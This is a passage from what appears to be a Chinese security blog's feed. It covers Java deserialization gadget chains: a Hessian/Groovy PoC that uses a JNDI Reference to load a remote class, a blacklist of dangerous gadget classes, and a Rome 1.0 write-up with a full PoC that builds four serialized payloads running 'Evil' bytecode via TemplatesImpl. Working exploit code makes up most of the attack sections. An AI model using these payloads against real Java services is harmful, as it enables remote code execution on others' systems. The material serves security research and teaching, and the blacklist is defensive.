class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line">        cpe.setResolvedObj(reference);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c1</span> <span class="operator">=</span> declaredConstructor.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(c1,<span class="string">&quot;listBindings&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ConvertedClosure</span> <span class="variable">convertedClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;compareTo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparable.class&#125;, convertedClosure);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; e = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor1 = e.getDeclaredConstructor(Object.class, Object.class, e);</span><br><span class="line">        declaredConstructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> declaredConstructor1.newInstance(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor2 = e.getDeclaredConstructor(Object.class, Object.class, e);</span><br><span class="line">        declaredConstructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor2.newInstance(o, <span class="number">2</span>, a);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; t = Class.forName(<span class="string">&quot;java.util.TreeMap&quot;</span>);</span><br><span class="line">        <span class="type">TreeMap</span> <span class="variable">treeMap</span> <span class="operator">=</span> (TreeMap) t.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(treeMap, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">modCount</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;modCount&quot;</span>);</span><br><span class="line">        modCount.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modCount.set(treeMap, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">root</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        root.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        root.set(treeMap, a);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">right</span> <span class="operator">=</span> e.getDeclaredField(<span class="string">&quot;right&quot;</span>);</span><br><span class="line">        right.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        right.set(a, o1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">            objectOutputStream.writeObject(treeMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br><span class="line">clojure.core$constantly</span><br><span class="line">clojure.main$eval_opt</span><br><span class="line">com.alibaba.citrus.springext.support.parser.AbstractNamedProxyBeanDefinitionParser$ProxyTargetFactory</span><br><span class="line">com.alibaba.citrus.springext.support.parser.AbstractNamedProxyBeanDefinitionParser$ProxyTargetFactoryImpl</span><br><span class="line">com.alibaba.citrus.springext.util.SpringExtUtil.AbstractProxy</span><br><span class="line">com.alipay.custrelation.service.model.redress.Pair</span><br><span class="line">com.caucho.hessian.test.TestCons</span><br><span class="line">com.mchange.v2.c3p0.JndiRefForwardingDataSource</span><br><span class="line">com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span><br><span class="line">com.rometools.rome.feed.impl.EqualsBean</span><br><span class="line">com.rometools.rome.feed.impl.ToStringBean</span><br><span class="line">com.sun.jndi.rmi.registry.BindingEnumeration</span><br><span class="line">com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br><span class="line">java.security.SignedObject</span><br><span class="line">java.util.ServiceLoader$LazyIterator</span><br><span class="line">javax.imageio.ImageIO$ContainsFilter</span><br><span class="line">javax.imageio.spi.ServiceRegistry</span><br><span class="line">javax.management.BadAttributeValueExpException</span><br><span class="line">javax.naming.InitialContext</span><br><span class="line">javax.naming.spi.ObjectFactory</span><br><span class="line">javax.script.ScriptEngineManager</span><br><span class="line">javax.sound.sampled.AudioFormat$Encoding</span><br><span class="line">org.apache.carbondata.core.scan.expression.ExpressionResult</span><br><span class="line">org.apache.commons.dbcp.datasources.SharedPoolDataSource</span><br><span class="line">org.apache.ibatis.executor.loader.AbstractSerialStateHolder</span><br><span class="line">org.apache.ibatis.executor.loader.CglibSerialStateHolder</span><br><span class="line">org.apache.ibatis.executor.loader.JavassistSerialStateHolder</span><br><span class="line">org.apache.ibatis.executor.loader.cglib.CglibProxyFactory</span><br><span class="line">org.apache.ibatis.executor.loader.javassist.JavassistSerialStateHolder</span><br><span class="line">org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource</span><br><span class="line">org.apache.wicket.util.upload.DiskFileItem</span><br><span class="line">org.apache.xalan.xsltc.trax.TemplatesImpl</span><br><span class="line">org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</span><br><span class="line">org.apache.xpath.XPathContext</span><br><span class="line">org.eclipse.jetty.util.log.LoggerLog</span><br><span class="line">org.geotools.filter.ConstantExpression</span><br><span class="line">org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder</span><br><span class="line">org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><br><span class="line">org.springframework.beans.factory.BeanFactory</span><br><span class="line">org.springframework.beans.factory.config.PropertyPathFactoryBean</span><br><span class="line">org.springframework.beans.factory.support.DefaultListableBeanFactory</span><br><span class="line">org.springframework.jndi.support.SimpleJndiBeanFactory</span><br><span class="line">org.springframework.orm.jpa.AbstractEntityManagerFactoryBean</span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager</span><br><span class="line">org.yaml.snakeyaml.tokens.DirectiveToken</span><br><span class="line">sun.rmi.server.UnicastRef</span><br><span class="line">javax.management.ImmutableDescriptor</span><br><span class="line">org.springframework.jndi.JndiObjectTargetSource</span><br><span class="line">ch.qos.logback.core.db.JNDIConnectionSource</span><br><span class="line">java.beans.Expression</span><br><span class="line">javassist.bytecode</span><br><span class="line">org.apache.ibatis.javassist.bytecode</span><br><span class="line">org.springframework.beans.factory.config.MethodInvokingFactoryBean</span><br><span class="line">com.alibaba.druid.pool.DruidDataSource</span><br><span class="line">com.sun.org.apache.bcel.internal.util.ClassLoader</span><br><span class="line">com.alibaba.druid.stat.JdbcDataSourceStat</span><br><span class="line">org.apache.tomcat.dbcp.dbcp.BasicDataSource</span><br><span class="line">com.sun.org.apache.xml.internal.security.signature.XMLSignatureInput</span><br><span class="line">javassist.tools.web.Viewer</span><br><span class="line">net.bytebuddy.dynamic.loading.ByteArrayClassLoader</span><br><span class="line">org.apache.commons.beanutils.BeanMap</span><br><span class="line">com.caucho.naming.QName</span><br><span class="line">com.sun.org.apache.xpath</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rome</title>
      <link href="/2023/10/06/Rome/"/>
      <url>/2023/10/06/Rome/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>ROME is a Java framework for RSS and Atom feeds. It’s open source and licensed under the Apache 2.0 license.</p><p>ROME includes a set of parsers and generators for the various flavors of syndication feeds, as well as converters to convert from one format to another. The parsers can give you back Java objects that are either specific for the format you want to work with, or a generic normalized SyndFeed class that lets you work on with the data without bothering about the incoming or outgoing feed type.</p></blockquote><p>依赖版本为rome 1.0。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p>com.sun.syndication.feed.impl.ObjectBean是Rome提供的一个封装类型，初始化时提供了一个Class类型和一个Object对象实例进行封装。ObjectBean也是使用委托模式设计的类，其中有三个成员变量，分别是EqualsBean&#x2F;ToStringBean&#x2F;CloneableBean类，这三个类为ObjectBean提供了equals、toString、clone以及hashCode方法。</p><p><img src="/2023/10/06/Rome/1709275818854-100419ee-5dac-4209-9d38-c590ab5bafad.png"></p><p>跟进ObjectBean#hashCode方法，调用EqualsBean#beanHashCode方法，EqualsBean#beanHashCode方法会调用EqualsBean保存的参数_obj的toString方法，这个toString方法也就是触发利用链的地方。</p><p><img src="/2023/10/06/Rome/1709275851696-a8240ca7-7355-42dc-89f3-1b84abba2733.png"></p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p>com.sun.syndication.feed.impl.ToStringBean是给对象提供toString方法的类，类中有两个toString方法，无参toString方法会获取调用链中上一个类或参数_obj中保存对象的类名，并调用有参toString方法。在有参toString方法中，会调用BeanIntrospector#getPropertyDescriptors方法来获取_beanClass的所有getter和setter方法，接着判断参数的长度，长度等于0的方法会使用_obj实例进行反射调用，通过这个点可以来触发TemplatesImpl的利用链。</p><p><img src="/2023/10/06/Rome/1709276841185-83c3a3df-3af9-4ad4-bba3-1679f0c32569.png"></p><h2 id="利用构造"><a href="#利用构造" class="headerlink" title="利用构造"></a>利用构造</h2><p>利用HashMap&#x2F;Hashtable反序列化触发ObjectBean#hashCode方法，调用EqualsBean#beanHashCode方法，再调用ToStringBean#toString方法，触发TemplatesImpl的利用链。</p><p>除此之外，还可以利用CC链中的BadAttributeValueExpException直接去调用ToStringBean#toString方法，或者直接利用EqualsBean中#HashCode方法进行后续调用，绕开ObjectBean#hashCode方法。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.example.deserialize.commonscollections.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeNormal</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">RomeNormal</span> <span class="variable">romeNormal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RomeNormal</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> romeNormal.payload1();</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> romeNormal.payload2();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> romeNormal.payload3();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> romeNormal.payload4();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(hashMap1);</span><br><span class="line">            System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()).length());</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Templates <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashMap <span class="title function_">payload1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, getTemplates());</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean1, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(objectBean1, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, objectBean));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Hashtable <span class="title function_">payload2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, getTemplates());</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(objectBean1, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(objectBean1, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, objectBean));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">payload3</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, getTemplates());</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, objectBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashMap <span class="title function_">payload4</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, getTemplates());</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(System.class, <span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(equalsBean, <span class="string">&quot;_obj&quot;</span>, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span 